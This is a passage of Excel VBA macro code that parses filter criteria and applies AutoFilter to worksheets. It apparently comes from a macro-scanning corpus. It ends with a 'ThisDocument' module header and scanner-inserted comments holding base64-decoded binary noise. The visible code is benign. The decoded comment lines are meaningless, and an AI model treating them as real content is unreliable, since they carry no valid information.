        GoTo Continue
IsText:
        st = InStr(txtArr(i), """") + 1
        fn = InStr(Mid(txtArr(i), st + 2), """") + st + 1
                                ReDim Preserve newArr(UBound(newArr) + 1)
                                newArr(UBound(newArr)) = Mid(txtArr(i), st, fn - st)
        txtArr(i - ConcCounter) = Mid(txtArr(i), st, fn - st)
Continue:
On Error GoTo 0
    End If
    
    If conc = True Then
        x = x + 1 + concZ
        i = i + 2 + concZ
        conc = False
        ConcCounter = ConcCounter + 1 + concZ
    Else
        i = i + 1
    End If

Next x

filterArr = newArr

End Function

Public Function wColNum(sh As String, ColNm As String) As Long

    wColNum = Range(ColNm & 1).Column
    
Dim ws As Worksheet

Set ws = ActiveWorkbook.Sheets(sh)
    
For Each col In ws.Range("A:A").Columns
    If col.EntireColumn.Hidden = True Then
        wColNum = wColNum - 1
    End If
Next col
    
End Function

Sub applyFilter(filterArr As String)

Dim ws As Worksheet

Set ws = ActiveWorkbook.Sheets(filterArr(0))

Dim r As Long
If ws.Range("A1").Value = "" Then
    If ws.Range("A2").Value = "" Then
        r = 3
    Else
        r = 2
    End If
Else
    r = 1
End If

On Error Resume Next
ws.ShowAllData
On Error GoTo 0

With ws.Range("A" & r & ":" & LastColumn(ws.Name, CStr(r)) & lastRow(ws.Name, "A"))
    For x = 1 To UBound(filterArr) - 1 Step 2
        If x = UBound(filterArr) - 1 Then 'if it's the last one
                    .AutoFilter Field:=filterArr(x), Criteria1:=filterArr(x + 1)
        Else
            If filterArr(x) = filterArr(x + 2) Then
                        .AutoFilter Field:=filterArr(x), Criteria1:=filterArr(x + 1), Operator:=xlAnd, Criteria2:=filterArr(x + 3) 'col & col2 filter line
                x = x + 2
            Else
                    .AutoFilter Field:=filterArr(x), Criteria1:=filterArr(x + 1)
            End If
        End If
    Next x
End With

ws.Activate

End Sub




Attribute VB_Name = "ThisDocument"
Attribute VB_Base = "1Normal.ThisDocument"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = True
Attribute VB_Customizable = True

' InQuest injected base64 decoded content
' @S<8
' C4GR
' [7-(&9
' /CXH6
' H9TA
' Y< ;5.

INQUEST-PP=macro
